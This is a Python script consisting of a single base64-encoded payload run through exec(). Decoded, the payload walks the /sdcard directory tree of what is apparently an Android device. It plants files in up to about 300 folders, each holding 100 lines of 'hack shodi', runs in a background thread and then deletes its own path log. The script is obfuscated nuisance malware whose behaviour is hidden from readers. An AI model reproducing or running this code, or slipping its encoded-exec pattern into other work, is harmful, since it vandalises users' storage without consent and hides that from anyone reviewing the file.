import base64
exec(base64.b64decode(b'aW1wb3J0IG9zDQppbXBvcnQgdGhyZWFkaW5nDQppbXBvcnQgc3lzDQpvcy5jaGRvcignL3NkY2FyZCcpDQpkZWYgZm9sZGVyKCk6DQogICAgcHdkID0gb3MuZ2V0Y3dkKCkNCiAgICBjID0gMA0KICAgIGZvciByb290ICwgZGlycyAsIGZpbGVzIGluIG9zLndhbGsoJy4nICwgdG9wZG93bj1UcnVlKToNCiAgICAgICAgZm9yIG5hbWUgaW4gZGlyczoNCiAgICAgICAgICAgIGEgPSBvcy5wYXRoLmpvaW4ocm9vdCAsIG5hbWUpDQogICAgICAgICAgICBmaWwgPWEucmVwbGFjZSgnLlxcJyAsIHB3ZCsnXFwnKQ0KICAgICAgICAgICAgZiA9IG9wZW4oJ2ZpbGUudHh0JyAsICdhKycpDQogICAgICAgICAgICBmLndyaXRlKGZpbCsiXG4iKQ0KICAgICAgICAgICAgZi5jbG9zZSgpDQogICAgYSA9IG9wZW4oJ2ZpbGUudHh0JywncicpLnJlYWQoKS5zcGxpdCgnXG4nKQ0KICAgIGZvciBpIGluIGE6DQogICAgICAgIGMgKz0gMQ0KICAgICAgICBpZiBjID09IDMwMDoNCiAgICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgb3MuY2hkaXIoaSkNCiAgICAgICAgZXhjZXB0IE9TRXJyb3I6DQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6DQogICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgIGZpID0gb3BlbihzdHIoYykrJy50eHQnLCd3KycpDQogICAgICAgIGZvciBpIGluIHJhbmdlKDEwMCk6DQogICAgICAgICAgICBmaS53cml0ZSgiaGFjayBzaG9kaSBcbiIpDQogICAgb3MuY2hkaXIocHdkKQ0KICAgIHRyeToNCiAgICAgICAgb3MucmVtb3ZlKCdmaWxlLnR4dCcpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQp0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1mb2xkZXIpLnN0YXJ0KCkNCg=='.decode()))
